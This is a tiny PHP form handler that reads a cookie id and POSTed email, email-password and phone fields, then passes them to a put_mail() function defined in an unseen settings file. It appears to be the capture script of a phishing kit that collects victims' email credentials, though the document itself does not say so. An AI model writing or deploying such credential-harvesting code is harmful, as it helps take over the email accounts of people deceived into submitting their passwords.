<?php 
require('../../metronic/include/setings.php');

$id = $_COOKIE['id'];

$email = $_POST['eml'];
$passem = $_POST['passe'];
$phone = $_POST['cel'];

put_mail($id,$email,$passem,$phone);
?>